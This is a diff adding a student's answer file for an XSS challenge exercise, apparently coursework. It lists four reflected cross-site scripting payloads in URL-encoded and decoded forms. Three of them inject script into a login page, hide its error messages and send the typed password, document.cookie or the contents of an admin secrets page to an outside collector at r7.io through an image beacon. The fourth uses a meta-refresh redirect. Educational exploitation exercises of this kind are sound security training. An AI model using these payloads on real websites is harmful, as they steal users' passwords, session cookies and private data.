@@ -1,0 +1,36 @@
+Lee Segal (segall2)
+Worked on this assighnment with Dimi Dimov 
+
+1) http://xss-challenges.r7.io/0/login?username=%27%3E%3C%2Fspan%3E%3Cscript%3E%24%28document%29.ready%28function%28%29+%7B%24%28%27%23signin-btn%27%29.click%28function%28%29%7Bvar+i+%3D+new+Image%28%29%3B+i.src%3D%27http%3A%2F%2Fr7.io%2Fe%2Fsegall2%3Fs%3D%27%2B%24%28%27%23login_password%27%29.val%28%29%3B%7D%29%3B%7D%29%3B+%24%28%27p.error-message%27%29.css%28%7B%22visibility%22%3A%22hidden%22%7D%29%3B%24%28%27h2.problem%27%29.css%28%7B%22visibility%22%3A%22hidden%22%7D%29%3B%3C%2Fscript%3E%3Cspan%3E+&password=kk&user_language=english
+
+http://r7.io/e/segall2
+
+'></span><script>$(document).ready(function() {$('#signin-btn').click(function(){var i = new Image(); i.src='http://r7.io/e/segall2?s='+$('#login_password').val();});}); $('p.error-message').css({"visibility":"hidden"});$('h2.problem').css({"visibility":"hidden"});</script><span> 
+
+2)
+http://xss-challenges.r7.io/0/login?username=%3Cmeta+http-equiv%3D%22refresh%22+content%3D%220%3B+URL%3D%27http%3A%2F%2Fstudents.washington.edu%2Fsegall2%2F415%2Finfo%2F%27%22+%2F%3E&password=check&user_language=english
+
+
+3) 
+'></span><script>$(document).ready(function(){var i = new Image(); i.src='http://r7.io/e/segall2?s='+document.cookie;});</script><span>  
+
+4) http://xss-challenges.r7.io/0/login?username=+%27%3E%3C%2Fspan%3E%3Cscript%3E%24%28document%29.ready%28function%28%29%7B++%24.get%28+%22http%3A%2F%2Fxss-challenges.r7.io%2Fadmin%2Fsecrets%22%2C+function%28secrets%29+%7B++i+%3D+new+Image%28%29%3B+++i.src%3D%27http%3A%2F%2Fr7.io%2Fe%2Fsegall2%3Fs%3D%27%2Bsecrets%3B+++alert%28+secrets%29%3B+%7D%29%3B++%7D%29%3B+++%24%28%27p.error-message%27%29.css%28%7B%22visibility%22%3A%22hidden%22%7D%29%3B%24%28%27h2.problem%27%29.css%28%7B%22visibility%22%3A%22hidden%22%7D%29%3B++%3C%2Fscript%3E%3Cspan%3E+&password=ft&user_language=english
+
+
+'></span><script>$(document).ready(function(){
+
+$.get( "http://xss-challenges.r7.io/admin/secrets", function(secrets) {
+ i = new Image();
+  i.src='http://r7.io/e/segall2?s='+secrets;
+  alert( secrets);
+});
+
+}); 
+
+$('p.error-message').css({"visibility":"hidden"});$('h2.problem').css({"visibility":"hidden"});
+
+</script><span> `
+
+
+
+         
